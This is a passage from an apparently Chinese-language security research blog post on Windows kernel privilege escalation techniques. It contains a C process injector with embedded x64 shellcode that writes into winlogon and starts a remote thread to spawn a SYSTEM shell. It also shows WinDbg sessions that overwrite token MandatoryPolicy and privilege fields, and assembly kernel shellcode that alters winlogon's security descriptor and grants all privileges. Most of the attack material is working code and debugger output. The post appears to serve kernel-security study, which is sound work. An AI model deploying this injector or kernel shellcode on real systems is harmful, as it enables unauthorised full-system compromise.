		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";

	while (TRUE) {
		DWORD pid = getProcessId(str);
		hEx = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if (hEx == NULL)
		{
			printf("Error opening winlogon process: %d\n", GetLastError());
		    // return FALSE;
		}
		else
		{
			break;
		}
	}
	
	pMem = VirtualAllocEx(hEx, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pMem == NULL)
	{
		printf("Error allocating space in winlogon process: %d\n", GetLastError());
		return FALSE;
	}
	if (!WriteProcessMemory(hEx, pMem, shellcode, sizeof(shellcode), 0))
	{
		printf("Error writing shellcode: %d\n", GetLastError());
		return FALSE;
	}
	if (!CreateRemoteThread(hEx, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL))
	{
		printf("Error starting thread: %d\n", GetLastError());
		return FALSE;
	}
	printf("Remote thread created\n");
	return TRUE;
}

int main() {
     injectCode();
	return 0;
}
```

由于普通用户进程是没有权限打开`winlogon`进程的，所以会一直打开失败而陷入死循环，然后我们在windbg中调整权限，让winlogon.exe可以被普通权限打开。

但是调整完成后，依然无法打开进程，这是因为winlogon.exe具有比较高的完整性界别，而我们的程序的完整性级别比较低，无法写完整性级别较高的进程。

[msdn文档](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_policy)。我们调整我们的漏洞利用程序的`MandatoryPolicy`为0即可。

| Value                                         | Meaning                                                      |
| :-------------------------------------------- | :----------------------------------------------------------- |
| **TOKEN_MANDATORY_POLICY_OFF**0x0             | No mandatory integrity policy is enforced for the token.     |
| **TOKEN_MANDATORY_POLICY_NO_WRITE_UP**0x1     | A process associated with the token cannot write to objects that have a greater mandatory integrity level. |
| **TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN**0x2 | A process created with the token has an integrity level that is the lesser of the parent-process integrity level and the executable-file integrity level. |
| **TOKEN_MANDATORY_POLICY_VALID_MASK**0x3      | A combination of **TOKEN_MANDATORY_POLICY_NO_WRITE_UP** and **TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN**. |

```assembly
0: kd> dt _token   (poi(ffffb78f2d4240c0+0x360)&0xFFFFFFFFFFFFFFF0 ) 
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffb78f`2e705b10 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0xf
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x1dc
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 4
   +0x098 UserAndGroups    : 0xffff9008`4a3bfdc0 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffff9008`4f055290 Void
   +0x0b0 DynamicPart      : 0xffff9008`4f055290  -> 0x501
   +0x0b8 DefaultDacl      : 0xffff9008`4f0552ac _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2000
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0xe
   +0x0d4 MandatoryPolicy  : 3
```

进行修改：

```assembly
0: kd> eb ffff9008`4a3bf930+0x0d4 0
0: kd> dt _token   (poi(ffffb78f2d4240c0+0x360)&0xFFFFFFFFFFFFFFF0 ) 
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffb78f`2e705b10 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0xf
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x1dc
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 4
   +0x098 UserAndGroups    : 0xffff9008`4a3bfdc0 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffff9008`4f055290 Void
   +0x0b0 DynamicPart      : 0xffff9008`4f055290  -> 0x501
   +0x0b8 DefaultDacl      : 0xffff9008`4f0552ac _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2000
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0xe
   +0x0d4 MandatoryPolicy  : 0
```

提权成功。

![](https://pic.wonderkun.cc//uploads/note/20210822164005.png)

### 写shellcode

不再解释了，直接贴一下shellcode吧。

```assembly
mov rax, [gs:0x188]                  ;stores KTHREAD value
mov rax, [rax+0x220]                 ;stores EPROCESS as an offset to KTHREAD
mov rcx, rax                         ;stores EPROCESS in rcx
mov rax, [rax+0x2f0]                 ;stores the next linked list pointer into rax
procloop:
  lea rbx, [rax-0x2f0]               ;stores EPROCESS address in rbx
  mov rax, [rax]                     ;stores  linked list pointer into rax
  add rbx, 0x450                     ;Get EPROCESS's ImageFileName
  cmp dword [rbx], 0x6c6e6977        ;compare it to "lniw" (winl)
  jne procloop                       ;if not equal repeat the drill
sub rbx, 0x450                       ;get EPROCESS of winlogon in rbx
sub rbx, 0x30                        ;get object_header
add rbx, 0x28                        ;get SecurityDescriptor
mov rax, [rbx]                       ;save SecurityDescriptor in rax
and rax, 0x0FFFFFFFFFFFFFFF0         ;zero SecurityDescriptor last 4 bits.
add rax, 0x48                        ;get the ACL[0] SID 
mov byte [rax], 0x0b                 ;Change it to 0x0b (This Organization)
add rcx, 0x360                       ;Access current process token structure
mov rax, [rcx]                       ;save token in rax
and rax, 0x0FFFFFFFFFFFFFFF0         ;remove the last nibble (fast reference)
add rax, 0x0d4                       ;Access the MandatorySecurityPolicy
mov byte [rax], 0                    ;change it to zero.
ret
```

在kscldr.exe中添加注入的代码就可以成功的弹出system权限的shell。

![](https://pic.wonderkun.cc//uploads/note/20210822190637.png)

## 方法三：直接编辑权限

### windbg调试

此方法比替换token的更进一步，直接修改token中的`SEP_TOKEN_PRIVILEGES`以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了。

我们看一下具体的数据结构：

```assembly
1: kd> dt _token 
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   ......
  
1: kd> dt _SEP_TOKEN_PRIVILEGES 
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B
```

`_SEP_TOKEN_PRIVILEGES`中：

- Present 表示启用的特权
- Enabled字段表示当前拥有的特权
- EnabledByDefault 默认拥有的特权

我们看一下system进程和cmd.exe进程分别的信息：

```assembly
1: kd> !process 0 0 system
PROCESS ffffbf845d896040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad002  ObjectTable: ffff8e0936605d40  HandleCount: 2284.
    Image: System

1: kd> dq ffffbf845d896040+0x360 L1 
ffffbf84`5d8963a0  ffff8e09`36607725
1: kd> dt _SEP_TOKEN_PRIVILEGES ffff8e09`36607720+0x40  
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x0000001f`f2ffffbc
   +0x008 Enabled          : 0x0000001e`60b1e890
   +0x010 EnabledByDefault : 0x0000001e`60b1e890
  
1: kd> !token ffff8e09`36607720 
_TOKEN 0xffff8e0936607720
TS Session ID: 0
User: S-1-5-18
User Groups: 
 00 S-1-5-32-544
    Attributes - Default Enabled Owner 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-11
    Attributes - Mandatory Default Enabled 
 03 S-1-16-16384
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-18
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
 08 0x000000008 SeSecurityPrivilege               Attributes - 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
 12 0x00000000c SeSystemtimePrivilege             Attributes - 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
 17 0x000000011 SeBackupPrivilege                 Attributes - 
 18 0x000000012 SeRestorePrivilege                Attributes - 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 28 0x00000001c SeManageVolumePrivilege           Attributes - 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
 32 0x000000020 SeRelabelPrivilege                Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default 
Authentication ID:         (0,3e7)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) 
Token ID: 3eb              ParentToken ID: 0
Modified ID:               (0, 3ec)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 0
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims
Process Token TrustLevelSid: S-1-19-1024-8192
```

cmd.exe进程相关的信息：

```assembly
0: kd> !process  0 0 cmd.exe 
PROCESS ffffab887e89d080
    SessionId: 1  Cid: 1b40    Peb: 92bee25000  ParentCid: 0c70
    DirBase: 469ed002  ObjectTable: ffff898d05d6ee00  HandleCount:  70.
    Image: cmd.exe

0: kd> dq  ffffab887e89d080+0x360 L1 
ffffab88`7e89d3e0  ffff898d`050a667c
0: kd> dt _SEP_TOKEN_PRIVILEGES   ffff898d`050a6670+0x40 
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x40800000
0: kd> !token ffff898d`050a6670
_TOKEN 0xffff898d050a6670
TS Session ID: 0x1
User: S-1-5-21-2935577425-332436725-3672547902-1000
User Groups: 
 00 S-1-5-21-2935577425-332436725-3672547902-513
    Attributes - Mandatory Default Enabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-114
    Attributes - DenyOnly 
 03 S-1-5-32-544
    Attributes - DenyOnly 
 04 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 05 S-1-5-4
    Attributes - Mandatory Default Enabled 
 06 S-1-2-1
    Attributes - Mandatory Default Enabled 
 07 S-1-5-11
    Attributes - Mandatory Default Enabled 
 08 S-1-5-15
    Attributes - Mandatory Default Enabled 
 09 S-1-5-113
    Attributes - Mandatory Default Enabled 
 10 S-1-5-5-0-123671
    Attributes - Mandatory Default Enabled LogonId 
 11 S-1-2-0
    Attributes - Mandatory Default Enabled 
 12 S-1-5-64-10
    Attributes - Mandatory Default Enabled 
 13 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-21-2935577425-332436725-3672547902-513
Privs: 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes - 
Authentication ID:         (0,1e50f)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: eede5            ParentToken ID: 0
Modified ID:               (0, 1e51b)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink
Process Token TrustLevelSid: (null)
```

可以看到`cmde.exe` 拥有的特权明显比`system`少很多，接下来修改cmd.exe的`Present`,`Enabled`都和`system`相同，再看一下。

```assembly
0: kd> eq ffff898d`050a6670+0x40 0x0000001f`f2ffffbc 
0: kd> eq ffff898d`050a6670+0x48 0x0000001f`f2ffffbc 
0: kd> !token ffff898d`050a6670
_TOKEN 0xffff898d050a6670
TS Session ID: 0x1
User: S-1-5-21-2935577425-332436725-3672547902-1000
User Groups: 
 00 S-1-5-21-2935577425-332436725-3672547902-513
    Attributes - Mandatory Default Enabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-114
    Attributes - DenyOnly 
 03 S-1-5-32-544
    Attributes - DenyOnly 
 04 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 05 S-1-5-4
    Attributes - Mandatory Default Enabled 
 06 S-1-2-1
    Attributes - Mandatory Default Enabled 
 07 S-1-5-11
    Attributes - Mandatory Default Enabled 
 08 S-1-5-15
    Attributes - Mandatory Default Enabled 
 09 S-1-5-113
    Attributes - Mandatory Default Enabled 
 10 S-1-5-5-0-123671
    Attributes - Mandatory Default Enabled LogonId 
 11 S-1-2-0
    Attributes - Mandatory Default Enabled 
 12 S-1-5-64-10
    Attributes - Mandatory Default Enabled 
 13 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-21-2935577425-332436725-3672547902-513
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - Enabled 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - Enabled 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - Enabled 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled 
 08 0x000000008 SeSecurityPrivilege               Attributes - Enabled 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled 
 12 0x00000000c SeSystemtimePrivilege             Attributes - Enabled 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled 
 17 0x000000011 SeBackupPrivilege                 Attributes - Enabled 
 18 0x000000012 SeRestorePrivilege                Attributes - Enabled 
 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - Enabled 
 28 0x00000001c SeManageVolumePrivilege           Attributes - Enabled 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - Enabled 
 32 0x000000020 SeRelabelPrivilege                Attributes - Enabled 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled 
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled 
Authentication ID:         (0,1e50f)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: eede5            ParentToken ID: 0
Modified ID:               (0, 1e51b)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink
Process Token TrustLevelSid: (null)
```

可以看到权限已经修改成功，但是来查看cmd.exe的用户名，发现并没有改变。

![](https://pic.wonderkun.cc//uploads/note/20210822193044.png)

当前进程已经有了system权限，接下来依然可以通过注入，弹出一个system权限的shell。

### 写shellcode 

```assembly
mov r9,qword ptr [gs:0x188]                   ;stores KPROCESS/currentThread value
mov r9,qword ptr [r9+0x220]                   ;stores EPROCESS as an offset to KTHREAD
mov rcx, r9                                   ;if equal, saves EPROCESS into rcx
add rcx, 0x360                                ;store cmd's token into rcx
mov rax,qword ptr [rcx]                       ;store token into rax
and rax, 0xFFFFFFFFFFFFFFF0                   ;remove the last nibble (fast reference)
mov r8,  0x1ff2ffffbc                         ;stores the 'all-in' privileges value into r8
mov qword ptr [rax+0x40],r8                   ;Changes 'Privileges' at offset 0x40 and god-mode it
mov qword ptr [rax+0x48],r8                   ;Changes 'Privileges' at offset 0x48 and god-mode it
ret
```

## 相关的代码

上面的测试代码放在github上，[https://github.com/wonderkun/flare-kscldr](https://github.com/wonderkun/flare-kscldr)

##  reference

1. https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf
2. https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-1
3. https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2
4. https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-3
5. https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code
6. https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess
7. https://www.matteomalvica.com/blog/2019/07/06/windows-kernel-shellcode/
8. https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/
9. https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf
10. https://github.com/fireeye/flare-kscldr
11. https://www.fireeye.com/blog/threat-research/2018/04/loading-kernel-shellcode.html
12. http://terminus.rewolf.pl/terminus/
13. https://ntdiff.github.io/
14. https://zhuanlan.zhihu.com/p/133514866
15. https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers
16. http://scz.617.cn:8/misc/201811071803.txt
17. https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers
